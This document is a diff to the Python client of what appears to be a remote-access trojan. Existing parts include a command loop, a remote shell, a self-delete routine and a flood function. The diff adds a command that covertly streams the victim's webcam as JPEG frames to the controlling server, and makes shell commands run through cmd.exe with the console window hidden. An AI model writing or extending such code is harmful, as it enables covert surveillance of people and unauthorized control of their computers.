@@ -8,8 +8,9 @@ import socket
 import ipaddress
 import struct
 import subprocess
+import cv2
 
-HOST, PORT = ('127.0.0.1', 8888)
+HOST, PORT = ('127.0.0.1', 80)
 
 reader:asyncio.StreamReader = None
 writer:asyncio.StreamWriter = None
@@ -130,6 +131,11 @@ async def connected_to_server():
         elif command == "shell":
             tokens = tokens[1:]
             await shell(tokens)
+        elif command == "stream_cam":
+            stream_cam_task = asyncio.create_task(stream_cam())
+        elif command == "stop_stream_cam":
+            stream_cam_task.cancel()
+            await stream_cam_task()
             
 async def delete_self():
     self_path = os.path.realpath(__file__)
@@ -167,19 +173,53 @@ async def flood(tokens:list):
         
         await asyncio.sleep(0.01)
 
+#? Stream the webcam via OpenCv, then encode to .jpg, then write to server
+async def stream_cam():
+    try:
+        cap = cv2.VideoCapture(0)
+        
+        while True:
+            ret, frame = cap.read()
+
+            if not ret:
+                break
+            
+            _, encoded_frame = cv2.imencode(".jpg", frame)
+            frame_bytes = encoded_frame.tobytes()
+            
+            #? Setup header with the frame
+            header = f"stream-cam-marker:byte-length:{len(frame_bytes)}".encode()
+            data = header + b"\n" + frame_bytes
+            writer.write(data)
+            await writer.drain()
+    except Exception as e:
+        pass
+
+#? Running and sending the output of shell commands
 async def shell(tokens:list):
     command = " ".join(tokens)
     
     try: 
-        result = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+        result = subprocess.run(f"cmd.exe /C {command}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
         stdout = result.stdout
         stderr = result.stderr
-        for line in result.stdout.splitlines():
-            server_response = "".join(line)
-        writer.write(server_response.encode())
+        server_response = ""
+                
+        for line in stdout.splitlines():
+            server_response += "\r\n" + line
+            
+        if stderr:
+            server_response = stderr
+            pass
+        
+        header = f"shell-marker:byte-length:{len(server_response.encode())}"
+        data = f"{header}\n{server_response}".encode()
+        writer.write(data)
+        await writer.drain()
     except Exception as e:
         print(e)
         writer.write("Does not exist".encode())
+        await writer.drain()
 
 if __name__ == "__main__":
     asyncio.run(setup())
